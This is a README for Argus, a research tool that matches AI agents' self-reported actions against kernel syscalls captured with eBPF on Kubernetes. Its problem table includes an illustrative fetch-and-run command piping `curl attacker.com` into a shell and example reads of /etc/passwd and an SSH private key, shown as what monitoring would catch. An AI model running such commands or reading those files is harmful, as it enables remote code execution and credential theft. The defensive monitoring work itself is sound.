# Argus

**Runtime observability for AI agents.**

Argus correlates the high-level actions an AI agent reports — LLM calls, tool invocations, file reads — with the kernel-level syscalls those actions actually produced. The result is a verifiable record of what an agent did, not just what it claimed to do.

Built on Cilium Tetragon (eBPF) for capture, Kubernetes pod metadata for attribution, and a lightweight Python SDK for instrumentation.

---

## The Problem

Application logs describe intent. They cannot describe behavior at the OS boundary.

| Application log | Underlying behavior |
|---|---|
| `Agent called OpenAI API` | `tcp_connect → 52.6.31.42:443`, `tcp_sendmsg × 3`, `fd_install × 8` |
| `Agent read config file` | `fd_install /etc/passwd`, `fd_install /home/user/.ssh/id_rsa` |
| `Agent ran a tool` | `execve /bin/sh -c "curl attacker.com \| sh"` |
| `Agent completed task` | 347 syscalls, 12s, 4 network destinations, 2 child processes |

For autonomous agents — which read files, open sockets, and spawn processes without human review — this gap is the difference between "the agent worked" and "the agent is safe."

Argus closes the gap.

---

## How It Works

```
   AI Agent (instrumented)              Kernel                    Argus
   ─────────────────────              ──────                    ─────
   ┌──────────────────┐               ┌─────────────────┐       ┌─────────────────┐
   │  argus_sdk       │  action       │  Tetragon       │ gRPC  │  ingestion      │
   │  session/action  │ ──lifecycle─► │  (eBPF probes)  │ ────► │  (TS, Node 20)  │
   └──────────────────┘               └─────────────────┘       └────────┬────────┘
                                                                          │
                                                                          ▼
                                                               ┌─────────────────┐
                                                               │  PostgreSQL 16  │
                                                               │  + correlator   │
                                                               └────────┬────────┘
                                                                        │
                                                                        ▼
                                                               ┌─────────────────┐
                                                               │  Dashboard      │
                                                               │  (Next.js)      │
                                                               └─────────────────┘
```

Tetragon tags every syscall with the originating Kubernetes pod. The SDK reports the pod each agent action runs in. The correlator joins them on `(pod_name, time_window)` using nanosecond-precision timestamps.

---

## Instrumentation

The SDK is a single Python file with zero runtime dependencies:

```python
from argus_sdk import ArgusSession

session = ArgusSession("my-agent", api_url="http://argus-api:3001")
session.start()

with session.action("llm_call", "openai.chat.completions") as act:
    result = openai.chat.completions.create(model="gpt-4", messages=[...])
    act.set_output(str(result.choices[0].message)[:500])

with session.action("tool_use", "read_document") as act:
    content = open("/data/report.pdf", "r").read()
    act.set_output(f"read {len(content)} bytes")

session.end()
```

When an action ends, the correlator attaches every syscall observed in that pod during the action's window. The dashboard renders it as a nested timeline:

```
llm_call / openai.chat.completions           1.2s   25 events
    tcp_connect  → 52.6.31.42:443              confidence: 1.0
    tcp_sendmsg  (3.2 KB)                      confidence: 1.0
    fd_install   (8 file descriptors)          confidence: 1.0

tool_use / read_document                      0.03s  14 events
    fd_install   /data/report.pdf              confidence: 1.0
    sys_write    (4.1 KB)                      confidence: 1.0
```

---

## Quick Start

Two deployment modes are supported. **Kubernetes is the reference path** — it provides reliable pod-scoped correlation. Docker Compose is offered for fast local exploration but falls back to PID/time-window matching, which is unreliable across PID namespaces.

### Prerequisites

- Docker Desktop (running)
- Node.js 20+
- pnpm — `npm install -g pnpm`
- For Kubernetes mode: `kubectl`, `kind`, and `helm` — `brew install kubectl kind helm`

### Kubernetes (recommended)

```bash
git clone https://github.com/Ditou007/argus.git && cd argus
pnpm install

pnpm k8s:setup           # provisions kind cluster, Tetragon, Postgres, Redis, Argus
pnpm k8s:port-forward    # exposes API on :3001
pnpm dev:dashboard       # dashboard on :3000
pnpm k8s:agent           # runs the instrumented sample agent
```

Open `http://localhost:3000` and select the latest session for the correlated timeline.

Operational helpers:

```bash
pnpm k8s:logs:ingestion
pnpm k8s:logs:api
pnpm k8s:logs:tetragon
./k8s/rebuild.sh api      # rebuild a single component after code changes
pnpm k8s:teardown
```

### Docker Compose

```bash
git clone https://github.com/Ditou007/argus.git && cd argus
pnpm install
docker compose up -d
pnpm dev:ingestion
pnpm dev:api
pnpm dev:dashboard
docker compose --profile agent run --rm sample-agent
```

---

## Architecture

```
argus/
├── packages/
│   ├── ingestion/     # Tetragon event consumer (gRPC + file tail)
│   ├── api/           # REST API (Express, factory pattern)
│   └── dashboard/     # Web UI (Next.js)
├── sample-agent/
│   ├── argus_sdk.py   # zero-dependency Python SDK
│   ├── agent_v2.py    # demo agent
│   └── Dockerfile
├── k8s/               # cluster manifests, setup/teardown scripts, TracingPolicies
├── policies/          # Tetragon policies for docker-compose mode
└── docker-compose.yml
```

### Stack

| Layer          | Technology                  |
|----------------|-----------------------------|
| eBPF runtime   | Cilium Tetragon v1.1.2      |
| Event pipeline | Node.js 20, TypeScript      |
| API            | Express                     |
| Storage        | PostgreSQL 16, Redis        |
| Dashboard      | Next.js 14, React 18        |
| Local cluster  | Kind, Helm                  |
| Agent SDK      | Python (no dependencies)    |

### Correlation

Under Kubernetes, correlation is deterministic:

1. Tetragon enriches every kernel event with `pod_name` of the originating process.
2. The SDK reports `pod_name` at session start (Downward API).
3. On action end, the correlator queries `events WHERE pod_name = $1 AND ts BETWEEN $2 AND $3`.
4. Tetragon emits nanosecond timestamps; window matches are exact.

Under Docker Compose, correlation degrades to PID + time window. PID reuse and namespace remapping make this best-effort only.

### API

| Method | Path | Description |
|--------|------|-------------|
| GET    | `/api/health`                                  | Health check |
| GET    | `/api/events?type=&binary=&limit=&offset=`     | List events (paginated, filterable) |
| GET    | `/api/events/stats`                            | Event counts by type |
| POST   | `/api/sessions`                                | Start a session |
| GET    | `/api/sessions`                                | List sessions |
| GET    | `/api/sessions/:id`                            | Session detail |
| PATCH  | `/api/sessions/:id/end`                        | End a session |
| POST   | `/api/sessions/:id/actions`                    | Start an action |
| PATCH  | `/api/sessions/actions/:id/end`                | End action and auto-correlate |
| GET    | `/api/sessions/actions/:id/events`             | Correlated kernel events for an action |
| GET    | `/api/sessions/:id/timeline`                   | Full session timeline |
| POST   | `/api/sessions/actions/:id/correlate`          | Force re-correlation |

---

## Roadmap

- [x] eBPF syscall capture, ingestion pipeline, live dashboard
- [x] Action ↔ syscall correlation, Kubernetes deployment
- [ ] Risk scoring and policy enforcement
- [ ] Alerting and notification sinks
- [ ] Deterministic replay
- [ ] RBAC and multi-tenancy
- [ ] OpenTelemetry exporter
- [ ] Benchmarks and performance hardening

---

## Status

Argus is an open research project exploring runtime governance for autonomous agents. Interfaces and storage formats may change without notice. It is not currently positioned as production-ready.

## License

MIT — see [`LICENSE`](./LICENSE).
